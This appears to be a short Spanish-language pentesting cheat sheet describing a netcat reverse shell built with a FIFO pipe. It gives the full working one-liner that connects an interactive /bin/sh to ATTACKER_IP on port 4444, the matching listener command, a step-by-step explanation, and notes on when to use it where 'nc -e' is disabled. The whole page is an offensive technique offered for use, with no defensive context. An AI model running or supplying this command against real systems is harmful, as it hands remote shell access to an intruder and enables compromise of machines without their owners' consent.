# Netcat Reverse Shell — FIFO

## Descripción

Esta técnica utiliza un **pipe FIFO** para crear una conexión interactiva cuando netcat no soporta la opción `-e`.

---

# Comando

```bash
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

---

# Listener

```bash
nc -lvnp 4444
```

---

# Requisitos

* netcat instalado
* permisos para crear archivos en `/tmp`

---

# Explicación

```
mkfifo /tmp/f     → crea pipe FIFO
cat /tmp/f        → lee entrada
/bin/sh -i        → shell interactiva
nc ATTACKER_IP    → conexión al atacante
> /tmp/f          → redirige salida
```

---

# Cuándo usarlo

* cuando `nc -e` está deshabilitado
* sistemas Unix con netcat básico

---

# Limitaciones

* deja archivo temporal
* requiere permisos de escritura
